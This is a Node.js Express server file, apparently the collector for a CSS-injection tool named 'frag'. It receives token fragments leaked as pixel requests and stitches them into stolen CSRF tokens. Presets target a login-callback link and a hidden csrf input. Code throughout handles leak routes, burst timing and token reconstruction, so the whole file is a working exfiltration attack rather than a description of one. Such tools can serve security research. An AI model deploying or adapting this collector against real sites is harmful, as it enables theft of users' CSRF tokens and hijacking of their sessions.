const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { stitchCharset } = require('./lib/stitch');
const { mountBlind } = require('./lib/blind-server');
const { chunkRoute, validChunk } = require('./lib/chunks');
const {
  ANCHOR_LENGTH, CHARSETS, charsetOf, charsetName, windowSizeFor, alphabetOf, foldWindows, caseBigramsIn,
} = require('./public/payload');

const G = '\x1b[32m';
const R = '\x1b[31m';
const Y = '\x1b[33m';
const D = '\x1b[2m';
const B = '\x1b[1m';
const X = '\x1b[0m';

function printBanner() {
  console.log(String.raw`
                                      \ | /
                                    -- * --
                                     / | \
                                ____/
                              _/
                           __/__
                          /_____/
               __________/     /
              /          \____/
             /                \          _______
            /                  \        /       \
           /     __________     \      /   c2e   \
          /     /          \     \     \         /
         /     /            \     \     \_______/
        /     /    {    }    \     /
        \     \              /   /         _______
         \     \____________/   /         /       \
          \                    /         /   2e1   \
           \                  /          \         /
            \                /            \_______/
             \______________/
                                          _______
                                         /       \
                                        /   e16   \
                                        \         /
                                         \_______/

          ______  _____       _       ____
         |  ____||  __ \     / \     / ___|
         | |__   | |__) |   / _ \   | |  _
         |  __|  |  _  /   / ___ \  | |_| |
         |_|     |_| \_\  /_/   \_\  \____|
`);
}

const PRESETS = {
  anchor: {
    selector: 'a[href^="https://example.com/m/callback/email?token="]',
    attribute: 'href',
    tokenName: 'CSRF token',
    startSelector: 'token=',
    endSelector: '&operation=login',
    tokenLength: 40,
    windowSize: 4,
    charset: 'hex',
  },
  hidden: {
    selector: 'input[type="hidden"][name="csrf"]',
    attribute: 'value',
    tokenName: 'csrf',
    startSelector: '',
    endSelector: '',
    tokenLength: 40,
    windowSize: 4,
    charset: 'hex',
  },
};

function parseSelector(selector) {
  const tagMatch = selector.match(/^([\w-]+)/);
  const tag = tagMatch ? tagMatch[1] : 'div';

  const prefixMatch = selector.match(/\[[\w-]+\^="([^"]*)"\]/);
  const selectorPrefix = prefixMatch ? prefixMatch[1] : '';

  return { tag, selectorPrefix };
}

const PIXEL = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

// A random sample token in the charset.
function sampleTokenFor(charset, length) {
  const bytes = crypto.randomBytes(length);
  switch (charset) {
    case 'base64': return bytes.toString('base64').slice(0, length);
    case 'base64url': return bytes.toString('base64url').slice(0, length);
    case 'alnum': {
      const alphabet = alphabetOf(CHARSETS.alnum);
      return Array.from(bytes, b => alphabet[b % alphabet.length]).join('');
    }
    default: return bytes.toString('hex').slice(0, length);
  }
}

function buildConfig(userConfig) {
  const { tag, selectorPrefix } = parseSelector(userConfig.selector);
  const attribute = userConfig.attribute || 'href';
  const tokenLength = userConfig.tokenLength || 40;
  // hex (default), or alnum/base64/base64url: see CHARSETS in public/payload.js.
  const charset = charsetName(userConfig.charset);
  const cs = charsetOf(charset);
  // Hex: 4-char windows give ~99% single-guess accuracy at 40 chars but ~4 MB
  // of CSS; 3-char windows ~260–280 KB, but longer tokens often come back as
  // candidates. Other charsets only offer 3-char windows.
  const windowSize = windowSizeFor(charset, userConfig.windowSize);
  // How a hidden input's requests reach a rendering element: the next sibling
  // (`sibling`, default) or the root via html:has() (`has`), which survives a
  // hidden element sitting next to the input. Ignored for anchors.
  const hostMode = userConfig.hostMode === 'has' ? 'has' : 'sibling';
  const sampleToken = sampleTokenFor(charset, tokenLength);
  const valuePrefix = selectorPrefix || userConfig.startSelector;
  const sampleExtra = userConfig.endSelector ? '&state=medium&rememberMe=false' : '';
  const sampleValue = valuePrefix + sampleToken + userConfig.endSelector + sampleExtra;

  let sampleHtml;
  if (tag === 'input') {
    const attrs = [...userConfig.selector.matchAll(/\[([\w-]+)="([^"]*)"\]/g)]
      .filter(([, name]) => name !== attribute);
    let attrStr = attrs.map(([, name, value]) => `${name}="${value}"`).join(' ');
    if (attrStr) attrStr = ' ' + attrStr;
    sampleHtml = `<input${attrStr} ${attribute}="${sampleValue}"><span style="color:#e0e0e0;word-break:break-all;font-size:13px">${sampleValue}</span>`;
  } else {
    sampleHtml = `<${tag} ${attribute}="${sampleValue}">${sampleValue}</${tag}>`;
  }

  // The start/end rules match the known text next to the token. Two chars
  // are enough for hex, which rarely recurs elsewhere in the attribute, but a
  // larger alphabet would also match e.g. "n=lo" in "&operation=login", so
  // other charsets use more of it (each extra char costs ~1-3 KB).
  const contextLength = cs.cased ? 8 : 2;
  const startContext = userConfig.startSelector ? userConfig.startSelector.slice(-contextLength) : '';
  const endContext = userConfig.endSelector ? userConfig.endSelector.slice(0, contextLength) : '';

  // Windows in the known text around the token (e.g. "bac" in "callback")
  // will leak too, and so will its case pairs; the solver treats them as
  // expected leftovers.
  const contextChunks = new Set();
  const contextCasePairs = new Set();
  for (const str of [valuePrefix, userConfig.endSelector || '', sampleExtra]) {
    for (const w of foldWindows(str, cs, windowSize)) contextChunks.add(w);
    for (const p of caseBigramsIn(str, cs)) contextCasePairs.add(p);
  }

  return {
    config: {
      selector: userConfig.selector,
      tokenName: userConfig.tokenName,
      attribute,
      tag,
      startContext,
      endContext,
      useStartsWith: !userConfig.startSelector,
      useEndsWith: !userConfig.endSelector,
      sampleToken,
      sampleHtml,
      tokenLength,
      windowSize,
      charset,
      hostMode,
    },
    contextChunks,
    contextCasePairs,
  };
}

const app = express();
const PORT = 3000;

// The browser fires every request for one extraction in a single burst, in
// any order. A quiet gap of SETTLE_MS separates extractions: stitching waits
// for it (stitching mid-burst can give a plausible but wrong token), and the
// first request after it starts a fresh extraction.
const SETTLE_MS = Number(process.env.FRAG_SETTLE_MS ?? 1000);

function emptyState() {
  return { start: null, end: null, chunks: new Set(), pairs: new Set(), lastAt: 0, dirty: true, cached: null };
}

let currentConfig, contextChunks, contextCasePairs, tokenLength, state;

function applyConfig(userConfig) {
  const result = buildConfig(userConfig);
  currentConfig = result.config;
  contextChunks = result.contextChunks;
  contextCasePairs = result.contextCasePairs;
  tokenLength = currentConfig.tokenLength;
  state = emptyState();
}

applyConfig(PRESETS.anchor);

app.use(express.json());

app.get('/config', (req, res) => res.json(currentConfig));

app.post('/api/config', (req, res) => {
  applyConfig(req.body);
  console.log(`\n${G}${B}config updated${X}`);
  console.log(`${D}selector: ${currentConfig.selector}${X}`);
  console.log(`${D}attribute: ${currentConfig.attribute}${X}`);
  console.log(`${D}length: ${currentConfig.tokenLength}${X}`);
  console.log(`${D}charset: ${currentConfig.charset}${X}`);
  console.log(`${D}window: ${currentConfig.windowSize}${X}`);
  if (currentConfig.tag === 'input') console.log(`${D}host: ${currentConfig.hostMode}${X}`);
  console.log('');
  res.json(currentConfig);
});

function record(t, c, res, next) {
  // Routes accept any chunk-like path; only what the current payload can
  // send is recorded (which also bounds memory).
  const length = t === 'm' ? currentConfig.windowSize : t === 'c' ? 2 : ANCHOR_LENGTH;
  if (!validChunk(currentConfig.charset, t, c, length)) return next();
  const now = Date.now();
  // A quiet gap means the previous burst is over. A different start while one
  // is in progress means a second extraction began right after the first
  // (the start is normally the first request of a burst).
  const newStart = t === 's' && state.start && state.start !== c;
  if (now - state.lastAt > SETTLE_MS || newStart) {
    state = emptyState();
    console.log(`\n${G}--- new extraction ---${X}`);
  }
  if (t === 's') {
    state.start = c;
    console.log(`${D}start:${X} ${c}`);
  } else if (t === 'e') {
    state.end = c;
    console.log(`${D}end:${X}   ${c}`);
  } else if (t === 'c') {
    state.pairs.add(c);
    console.log(`${D}case pair #${state.pairs.size}:${X} ${c}`);
  } else {
    state.chunks.add(c);
    console.log(`${D}chunk #${state.chunks.size}:${X} ${c}`);
  }
  state.lastAt = now;
  state.dirty = true;
  res.type('gif').send(PIXEL);
}

// Leak routes come before the static files so each pixel skips a disk lookup.
// Paths only match chunk-like segments of the lengths a payload can use.
for (const t of ['s', 'e', 'c']) {
  app.get(`/${t}/:c(${chunkRoute(2, 2)})`, (req, res, next) => record(t, req.params.c, res, next));
}
app.get(`/:c(${chunkRoute(3, 4)})`, (req, res, next) => record('m', req.params.c, res, next));
mountBlind(app, { settleMs: SETTLE_MS, pixel: PIXEL });

app.use(express.static(path.join(__dirname, 'public')));
app.use('/graphics', express.static(path.join(__dirname, 'graphics')));

app.get('/api/token', (req, res) => {
  if (!state.start) {
    return res.json({ status: 'waiting' });
  }
  if (Date.now() - state.lastAt < SETTLE_MS) {
    return res.json({ status: 'partial', start: state.start, end: state.end, chunks: state.chunks.size });
  }
  if (!state.dirty && state.cached) {
    return res.json(state.cached);
  }
  const result = stitchCharset({ ...state, chunks: [...state.chunks], pairs: [...state.pairs] }, {
    charset: charsetOf(currentConfig.charset),
    windowSize: currentConfig.windowSize,
    tokenLength,
    context: contextChunks,
    caseContext: contextCasePairs,
  });
  if (result) {
    if (result.candidates) {
      const more = result.truncated ? '+' : '';
      console.log(`\n${Y}${B}ambiguous (${result.candidates.length}${more} candidates, ${result.length} chars):${X}`);
      result.candidates.forEach(c => console.log(`  ${c}`));
    } else {
      console.log(`\n${G}${B}recovered token (${result.length} chars):${X} ${result.token}`);
    }
    if (result.caseUnresolved) console.log(`${Y}letter case could not be recovered; shown in lowercase${X}`);
    state.cached = {
      status: 'ok',
      token: result.token,
      length: result.length,
      candidates: result.candidates,
      truncated: result.truncated,
      caseUnresolved: result.caseUnresolved,
    };
  } else {
    state.cached = {
      status: 'partial',
      start: state.start,
      end: state.end,
      chunks: state.chunks.size,
    };
  }
  state.dirty = false;
  res.json(state.cached);
});

app.get('/api/reset', (req, res) => {
  state = emptyState();
  console.log(`${D}state reset${X}`);
  res.json({ status: 'ok' });
});

if (require.main === module) {
  app.listen(PORT, () => {
    printBanner();
    console.log(`${G}${B}frag${X} listening on ${B}http://localhost:${PORT}${X}`);
    console.log(`${D}visit http://localhost:${PORT} in your browser to get started${X}\n`);
  });
}

module.exports = { app, buildConfig, PRESETS };
